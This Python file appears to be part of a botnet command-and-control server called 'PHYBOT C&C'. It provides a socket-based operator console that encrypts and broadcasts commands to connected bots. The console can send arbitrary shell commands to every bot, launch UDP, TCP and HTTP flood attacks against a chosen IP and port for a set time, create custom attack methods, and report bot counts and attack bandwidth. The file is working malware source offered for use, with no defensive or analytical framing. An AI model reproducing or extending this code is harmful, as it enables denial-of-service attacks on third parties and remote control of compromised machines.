from pystyle import Colors, Colorate
import time
from colorama import Fore
import os
import json
from .config import c2_config_t as tconf
from .crypt import Crypt as crypt
from .loops import Loops as loop


class Client():

    def __init__(self, urlkey: str, api_url: str, relaykey: str, speed: list=[], relay: dict={}, temprbots: list=[], rbots: list=[], bots: list=[], enckeyD: str=""):
        self.banner="""
            dMMMMb     dMP dMP    dMP dMP     dMMMMb    .aMMMb  dMMMMMMP
           dMP.dMP    dMP dMP    dMP.dMP     dMP"dMP   dMP"dMP    dMP
          dMMMMP"    dMMMMMP     VMMMMP     dMMMMK"   dMP dMP    dMP
         dMP        dMP dMP    dA .dMP     dMP.aMF   dMP.aMP    dMP
        dWP        dEP dAP     VREAP"     dNONYP"    VMOUP"    dSP

                    C                N                C
"""
        self.ansi_clear='\033[2J\033[H'
        self.w=Fore.GREEN
        self.y=Fore.WHITE
        self.r=Fore.RESET
        self.rd=Fore.RED

        self.enckeyD=enckeyD
        self.urlkey=urlkey
        self.api_url=api_url
        self.relaykey=relaykey
        self.speed=speed
        self.relay=relay
        self.temprbots=temprbots
        self.rbots=rbots
        self.bots=bots


    def broadcast(self, data: str):
        print(f"send {data}")
        dead_relay = []
        for relays in list(self.relay):
            try:
                self.send(relays, f'{data}', False, False)
            except:
                dead_relay.append(self.relay)
        for relays in list(dead_relay):
            self.relay.pop(relays)
            relays.close()


    def send(self, socket, data: str, escape=True, reset=True):
        if reset:
            data += Fore.RESET
        if escape:
            data += '\r\n'
        socket.send(data.encode())


    def update_title(self, client, username: str):
        while 1:
            try: 
                self.send(client, f'\33]0;{username}@PHYBOT C&C  |  Bots: {sum(self.bots)}  |  Relay: {len(self.relay)}  |  Speed: {sum(self.speed)/125000} Gbps  |  {time.asctime(time.localtime())}\a', False)
                time.sleep(tconf.uptitl_t)
            except:
                client.close()



    def command_line(self, client, username: str):
        for x in self.banner.split('\n'):
            self.send(client, x)
        self.send(client, "\n")
        self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Bots: {sum(self.bots)}", 1)+f"{self.y})")
        self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Relays: {len(self.relay)}", 1)+f"{self.y})")
        self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Speed: {sum(self.speed)/125000} Gbps", 1)+f"{self.y})")
        self.send(client, "\n")
        prompt=f'{Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)}{self.y}.{Colorate.Horizontal(Colors.blue_to_purple, username, 1)}{self.y} /> '
        self.send(client, prompt, False)

        while 1:
            try:
                data = client.recv(1024).decode().strip()
                if not data:
                    continue

                args = data.split(' ')
                command = args[0].upper()
                cmd=data
                
                if command == 'HELP':
                    tab=Colorate.Vertical(Colors.yellow_to_red, f"""
    ╔═══════════════╦══════════════════════════════════════════╗
    ║  HELP         ║   Shows list of commands                 ║
    ╠═══════════════╬══════════════════════════════════════════╣
    ║  CMD          ║   Send an command to all bots            ║
    ╠═══════════════╬══════════════════════════════════════════╣
    ║  ATTACK       ║   Start an attack                        ║
    ╠═══════════════╬══════════════════════════════════════════╣
    ║  MSG          ║   Send an message into the bots p2p net  ║
    ╠═══════════════╬══════════════════════════════════════════╣
    ║  METHOD HELP  ║   List all Method commands               ║
    ╠═══════════════╬══════════════════════════════════════════╣
    ║  BOTS         ║   List all the connected bots            ║
    ╠═══════════════╬══════════════════════════════════════════╣
    ║  SPEED        ║   Get the speed of all bots              ║
    ╠═══════════════╬══════════════════════════════════════════╣
    ║  PING         ║   Ping all relay                         ║
    ╠═══════════════╬══════════════════════════════════════════╣
    ║  CLEAR        ║   Clears the screen                      ║
    ╠═══════════════╬══════════════════════════════════════════╣
    ║  LOGOUT       ║   Disconnects from CnC server            ║
    ╚═══════════════╩══════════════════════════════════════════╝

                    """, 1)
                    for x in tab.split("\n"):
                        self.send(client, x)
                                
                elif data=="METHOD CLEAR":
                    self.broadcast(data)
                    with open("method.json", "w") as f:
                        f.write("{}")
                
                elif data=="METHOD HELP":
                    tab=Colorate.Vertical(Colors.yellow_to_red, f"""
    ╔══════════════════╦══════════════════════════════════════════╗
    ║  METHOD CREATE   ║   Send a new ATTACK method to all bots   ║
    ╠══════════════════╬══════════════════════════════════════════╣
    ║  METHOD CLEAR    ║   Clear all methods                      ║
    ╠══════════════════╬══════════════════════════════════════════╣
    ║  METHOD          ║   Start an attack with your method       ║
    ╠══════════════════╬══════════════════════════════════════════╣
    ║  METHODS         ║   List all methods                       ║
    ╚══════════════════╩══════════════════════════════════════════╝

                    """, 1)
                    for x in tab.split("\n"):
                        self.send(client, x)

                elif command == 'CLEAR':
                    self.send(client, self.ansi_clear, False)
                    for x in self.banner.split('\n'):
                        self.send(client, x)
                    self.send(client, "\n")
                    self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Bots: {sum(self.bots)}", 1)+f"{self.y})")
                    self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Relays: {len(self.relay)}", 1)+f"{self.y})")
                    self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Speed: {sum(self.speed)/125000} Gbps", 1)+f"{self.y})")
                    self.send(client, "\n")

                elif command == 'LOGOUT':
                    self.send(client, 'Goodbye')
                    time.sleep(1)
                    break
                
                elif command=="CMD":
                    if len(data.split(" "))==1:
                        self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.purple_to_red, f"CMD need <command> argument!", 1)+f"{self.y})")
                    else:
                        rcmd=str(data)
                        self.broadcast(crypt(enckey=self.enckeyD).encryptD(rcmd.encode()))
                
                elif command=="SPEED":
                    try:
                        loop(urlkey=self.urlkey, api_url=self.api_url, relaykey=self.relaykey, speed=self.speed, relay=self.relay, temprbots=self.temprbots, rbots=self.rbots, bots=self.bots)._net()
                        self.send(client, f"{sum(self.speed)/125000} Gbps")
                    except Exception as e:
                        self.send(client, f"{self.rd}[{self.y}!{self.rd}]{self.r} Error: {e}")
                    
                elif command=="BOTS":
                    try:
                        loop(urlkey=self.urlkey, api_url=self.api_url, relaykey=self.relaykey, speed=self.speed, relay=self.relay, temprbots=self.temprbots, rbots=self.rbots, bots=self.bots)._getbot()
                        self.send(client, f"{sum(self.bots)} Bots")
                    except Exception as e:
                        self.send(client, f"{self.rd}[{self.y}!{self.rd}]{self.r} Error: {e}")
                
                elif command=="PING":
                    loop(urlkey=self.urlkey, api_url=self.api_url, relaykey=self.relaykey, speed=self.speed, relay=self.relay, temprbots=self.temprbots, rbots=self.rbots, bots=self.bots)._ping()
                
                elif command=="METHOD":
                    try:
                        if len(data.split(" "))==1:
                            self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.purple_to_red, f"METHOD need <name> arguments!", 1)+f"{self.y})")
                        elif len(data.split(" "))!=1:
                            cmd=str(data)
                            args=data.replace("METHOD ", "")
                            arg=args.split(" ")
                            if arg[0]=='CREATE':
                                if len(data.split(" "))<4:
                                    self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.purple_to_red, f"METHOD CREATE need <name> and <command> arguments!", 1)+f"{self.y})")
                                else:
                                    self.broadcast(crypt(enckey=self.enckeyD).encryptD(cmd.encode()))
                                    name=arg[1]
                                    cmd=args.replace("CREATE ", "").replace(f"{name} ", "")
                                    print(cmd)
                                    with open("method.json", "r") as f:
                                        tb1=json.load(f)
                                        tb1=str(tb1).replace('{"', '"').replace("{}", "")
                                        tb1=str(tb1).replace("}    ", "")
                                        tb="""""" + "'" + name + "'" + """: {
        "name": """ + "'" + name + "'" + """,
        "command": """ + "'" + cmd + "'" + """
    }"""
                                    if not tb1 == None:
                                        tb="{"+tb1+",\n"+tb+"\n}    "
                                    else:
                                        tb="{"+tb+"\n}    "
                                    tb=tb.replace("{{", "{").replace("}}", "}")
                                    with open("method.json", "w") as f:
                                        f.write(tb.replace("'", '"').replace("{,", "{"))
                            elif arg[0]!='CREATE':
                                self.broadcast(crypt(enckey=self.enckeyD).encryptD(cmd.encode()))
                                self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.cyan_to_green, f"Command {arg[0]} send to all bots!", 1)+f"{self.y})")
                    except Exception as e:
                        self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.purple_to_red, f"Error: {e}", 1)+f"{self.y})")
                
                elif command=="METHODS":
                    args=data.replace("METHOD ", "")
                    arg=args.split(" ")
                    name=arg[0]
                    if os.path.exists("method.json"):
                        with open("method.json", "r") as f:
                            data = json.load(f)
                            for (key, val) in data.items():
                                self.send(client, f"{key}: {val['command']}")
                    else:
                        with open("method.json", "w") as f:
                            f.write("{}")
                        self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.purple_to_red, f"Nothing found", 1)+f"{self.y})")
                
                elif command=="MSG":
                    if len(args)<4:
                        self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.purple_to_red, "MSG need <ip> <port> <data>", 1)+f"{self.y})")
                    try:
                        ip=args[1]
                        port=args[2]
                        data=args[3]
                        loop(urlkey=self.urlkey, api_url=self.api_url, relaykey=self.relaykey, speed=self.speed, relay=self.relay, temprbots=self.temprbots, rbots=self.rbots, bots=self.bots)._smsg(ip, port, data)
                    except Exception as e:
                        self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.purple_to_red, f"Error: {e}", 1)+f"{self.y})")

                elif str(cmd).startswith("ATTACK"):
                    try:
                        cmd=str(cmd)
                        print(cmd)
                        args=cmd.replace("ATTACK", "")
                        args=args.split(" ")
                        args.remove("")
                        if len(args)!=4:
                            self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.purple_to_red, f"ATTACK need <ip> <port> <attack time> <UDP or TCP or HTTP> arguments!", 1)+f"{self.y})")
                        else:
                            attackIP=args[0]
                            attackP=args[1]
                            tps=args[2]
                            method=args[3]
                            cmd=f"{attackIP}:{attackP}/{tps}-{method}"
                            self.broadcast(crypt(enckey=self.enckeyD).encryptD(cmd.encode()))
                            loop(urlkey=self.urlkey, api_url=self.api_url, relaykey=self.relaykey, speed=self.speed, relay=self.relay, temprbots=self.temprbots, rbots=self.rbots, bots=self.bots)._net()
                            self.broadcast(crypt(enckey=self.enckeyD).encryptD(cmd.encode()))
                            self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Bots: {len(self.bots)}", 1)+f"{self.y})")
                            self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Attack IP: {attackIP}", 1)+f"{self.y})")
                            self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Attack Port: {attackP}", 1)+f"{self.y})")
                            self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Attack Time: {tps}", 1)+f"{self.y})")
                            self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Attack Method: {method}", 1)+f"{self.y})")
                            self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Attack Speed: {sum(self.speed)/125000} Gbps", 1)+f"{self.y})")
                            self.send(client, "\n")
                    except Exception as e: self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.purple_to_red, f"Attack Error: {e}", 1)+f"{self.y})")
                else:
                    self.send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+self.y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{self.y}("+Colorate.Horizontal(Colors.purple_to_red, f"Unknown Command", 1)+f"{self.y})")

                self.send(client, prompt, False)
            except:
                break
            
        client.close()
